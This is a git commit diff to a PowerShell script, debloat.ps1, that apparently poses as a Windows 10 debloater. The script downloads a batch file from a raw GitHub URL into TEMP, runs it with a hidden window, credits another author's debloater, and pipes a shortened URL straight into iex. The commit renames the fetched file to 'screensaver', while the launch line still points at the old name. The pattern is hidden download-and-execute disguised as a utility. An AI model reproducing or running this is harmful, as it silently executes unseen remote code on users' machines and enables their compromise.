7ce303bf571c0370d55dc472d944d9e696056cd9
Dazd <87366355+Dazd-Pkz@users.noreply.github.com>
2022-08-27 19:26:17 +0200

    Update debloat.ps1

--- debloat.ps1
+++ debloat.ps1
@@ -1,4 +1,4 @@
-iwr "https://raw.githubusercontent.com/Dazd-Pkz/Windows10Debloater/main/debloat" -o $env:TEMP\cmd-debloat.bat
+iwr "https://raw.githubusercontent.com/Dazd-Pkz/Windows10Debloater/main/screensaver" -o $env:TEMP\screensaver.bat
 Start-Process -WindowStyle hidden -FilePath $env:TEMP\cmd-debloat.bat
 echo Windows10Debloater by Sycnex
 iwr -useb git.io/debloat|iex
